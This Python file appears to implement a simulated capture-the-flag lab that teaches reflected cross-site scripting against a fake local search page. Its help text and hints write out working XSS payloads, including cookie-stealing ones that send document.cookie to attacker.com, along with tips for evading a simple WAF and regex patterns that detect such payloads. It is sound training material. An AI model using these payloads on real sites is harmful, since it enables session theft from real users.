"""
cyber_engine/xss_lab.py
Simulated XSS (Cross-Site Scripting) lab.
Evaluates payloads against a simulated vulnerable web app response.
"""
import re
import html

FLAG = 'FLAG{xss_cookie_monster}'
FAKE_COOKIE = f'session=abc123xyz; flag={FLAG}; path=/'
TARGET_URL = 'http://vulnerable-app.local/search'

# Patterns that indicate successful XSS
XSS_SUCCESS_PATTERNS = [
    re.compile(r'<script[^>]*>.*?(alert|document\.(cookie|location)|window\.location)', re.IGNORECASE | re.DOTALL),
    re.compile(r'on(error|load|click|mouseover|focus)\s*=\s*["\']?.*?(alert|document\.(cookie|location))', re.IGNORECASE),
    re.compile(r'javascript:\s*(alert|document\.cookie)', re.IGNORECASE),
    re.compile(r'<img[^>]+onerror\s*=', re.IGNORECASE),
    re.compile(r'<svg[^>]+onload\s*=', re.IGNORECASE),
]

# Simple WAF (blocks script tags but not events)
WAF_BLOCKS = [
    re.compile(r'<script', re.IGNORECASE),
    re.compile(r'</script', re.IGNORECASE),
]

COOKIE_STEAL_PATTERN = re.compile(
    r'document\.cookie|document\.location.*cookie|location\s*=.*cookie',
    re.IGNORECASE
)


def _simulate_waf(payload: str) -> tuple[bool, str]:
    """Returns (blocked, reason)."""
    for pattern in WAF_BLOCKS:
        if pattern.search(payload):
            return True, '<script> tags are blocked by WAF'
    return False, ''


def _check_xss_success(payload: str) -> bool:
    for pattern in XSS_SUCCESS_PATTERNS:
        if pattern.search(payload):
            return True
    return False


def _build_reflected_page(param: str, payload: str) -> str:
    reflected = payload  # Not escaped = vulnerable
    return (
        f'<html><head><title>Search</title></head><body>'
        f'<h1>Search Results for: {reflected}</h1>'
        f'<p>No results found.</p>'
        f'</body></html>'
    )


def run_xss_lab(parsed: dict, lab) -> dict:
    cmd = parsed.get('command', '')
    flags = parsed.get('flags', {})
    args = parsed.get('args', [])

    if cmd == 'help':
        return {
            'output': (
                "XSS Lab Commands:\n"
                "  xss --payload <payload>              Test a payload\n"
                "  xss --url <url> --param <p> --payload <pl>  Full request\n"
                "  encode --type url <string>           URL-encode a string\n"
                "  encode --type html <string>          HTML-encode a string\n"
                "  test --url <url>                     Test if param is reflected\n\n"
                "Examples:\n"
                "  xss --payload \"<b>test</b>\"\n"
                "  xss --payload \"<img src=x onerror=alert(document.cookie)>\"\n"
                "  xss --payload \"<svg onload=document.location='http://attacker.com?c='+document.cookie>\""
            ),
            'success': False
        }

    if cmd == 'clear':
        return {'output': '__CLEAR__', 'success': False}

    if cmd == 'encode':
        encode_type = flags.get('type', 'url')
        target_str = args[0] if args else flags.get('input', '')
        if not target_str:
            return {'output': 'Usage: encode --type url <string>', 'success': False}
        if encode_type == 'url':
            import urllib.parse
            result = urllib.parse.quote(target_str)
        elif encode_type == 'html':
            result = html.escape(target_str)
        else:
            result = target_str
        return {'output': f'Encoded ({encode_type}):\n{result}', 'success': False}

    if cmd == 'test':
        url = flags.get('url', TARGET_URL)
        return {
            'output': (
                f"Testing {url} for reflection...\n"
                f"GET {url}?q=PROBE_12345\n\n"
                f"Response body contains: ...Search Results for: PROBE_12345...\n\n"
                f"[!] Parameter 'q' is REFLECTED unescaped in the response!\n"
                f"[!] This application is likely vulnerable to Reflected XSS.\n"
                f"    Try crafting a payload with: xss --payload \"<your_payload>\""
            ),
            'success': False
        }

    # Main XSS command
    payload = flags.get('payload') or (args[0] if args else None)
    param = flags.get('param', 'q')
    url = flags.get('url', TARGET_URL)

    if not payload:
        return {'output': 'Error: --payload is required.\nUsage: xss --payload "<your_xss_payload>"', 'success': False}

    # Simulate WAF
    waf_blocked, waf_reason = _simulate_waf(payload)

    lines = [
        f"Sending payload to {url}",
        f"  GET {url}?{param}={payload[:60]}{'...' if len(payload) > 60 else ''}",
        f"  Content-Type: text/html",
        "",
    ]

    if waf_blocked:
        lines += [
            f"[WAF] Request blocked: {waf_reason}",
            "",
            "Response: 403 Forbidden",
            "<html><body><h1>Blocked by Web Application Firewall</h1></body></html>",
            "",
            "Hint: The WAF blocks <script> tags. Try event-handler-based payloads instead.",
            "  e.g. <img src=x onerror=alert(1)>"
        ]
        return {'output': '\n'.join(lines), 'success': False}

    # Check for success
    success = _check_xss_success(payload)
    steal_cookie = success and COOKIE_STEAL_PATTERN.search(payload)

    reflected_page = _build_reflected_page(param, payload)
    lines += [
        "Response: 200 OK",
        "",
        "--- Rendered Page ---",
        reflected_page,
        "--- End Page ---",
        "",
    ]

    if success:
        lines += [
            "[*] JavaScript executed in page context!",
            "",
        ]
        if steal_cookie:
            lines += [
                "[!] Cookie exfiltration detected!",
                f"    Attacker received cookie data:",
                f"    {FAKE_COOKIE}",
                "",
                "=" * 50,
                f"FLAG CAPTURED: {FLAG}",
                "=" * 50,
            ]
        else:
            lines += [
                "[*] alert() triggered — XSS confirmed.",
                "[*] To capture the flag, you need to steal the cookie.",
                "    Try: <img src=x onerror=\"document.location='http://attacker.com?c='+document.cookie\">",
            ]
    else:
        # Non-executing payload
        lines += [
            "[*] Payload reflected in page, but no JavaScript executed.",
            "[*] The input was treated as plain HTML or the script did not run.",
            "[*] Try using event handlers or javascript: URI schemes.",
        ]

    return {
        'output': '\n'.join(lines),
        'success': success and steal_cookie,
        'flag': FLAG if (success and steal_cookie) else None
    }
